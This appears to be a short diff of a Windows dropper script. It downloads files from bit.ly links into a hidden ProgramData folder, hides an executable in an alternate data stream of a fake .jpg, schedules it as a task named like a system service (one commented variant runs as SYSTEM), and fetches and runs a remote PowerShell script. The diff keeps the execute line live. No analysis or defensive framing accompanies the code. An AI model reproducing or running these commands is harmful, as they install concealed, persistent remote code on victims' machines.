@@ -7,6 +7,6 @@ cmd /c "curl https://bit.ly/3sIId5a -o C:\ProgramData\.temp\94002.jpg:services.e
 # schtasks /create /s $env:ComputerName /ru "SYSTEM" /tn "servicesfc.exe" /tr C:\ProgramData\.temp\94002.jpg:services.exe /sc once /sd 12/25/2025 /st 15:00:00 /v1 /z
 cmd /c 'schtasks /create /tn "servicesfc.exe" /tr C:\ProgramData\.temp\94002.jpg:services.exe /sc once /st 15:00 /sd 12/25/2025'
 wget -O C:\ProgramData\.temp\system64.ps1 https://bit.ly/3KlymYH
-powershell -File 'C:\ProgramData\.temp\system64.ps1'
+powershell -File C:\ProgramData\.temp\system64.ps1
 
 # cmd /c "wget -O C:\ProgramData\.temp\94002.jpg:system64.exe https://bit.ly/3N1H14G && C:\ProgramData\.temp\94002.jpg:system64.exe"
